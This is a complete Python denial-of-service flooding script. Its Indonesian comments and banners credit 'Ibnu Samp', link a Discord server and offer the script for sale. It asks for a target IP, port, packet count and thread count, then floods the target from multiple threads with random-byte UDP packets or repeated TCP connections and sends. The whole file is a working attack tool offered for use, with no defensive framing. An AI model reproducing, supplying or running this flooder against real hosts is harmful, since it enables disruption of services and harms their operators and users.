#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by Ibnu Samp
#Join My Servers : https://discord.gg/unitypride
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by Ibnu Samp")
print("Jual 10k aja")
print("Minat? PM me ")
ip = str(input(" DdosAttackByIbnu Samp | Ip mas:"))
port = int(input(" DdosAttackByIbnu Samp | Port mas:"))
choice = str(input(" DdosAttackByIbnu Samp | mulai ga mas?(y/n):"))
times = int(input(" DdosAttackByIbnu Samp | Packets mas:"))
threads = int(input(" DdosAttackByIbnu Samp | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Send !!! |")
		except:
			print("[!] | Kasian down:(l!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send !!!")
		except:
			s.close()
			print("[*] Kasian:(")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
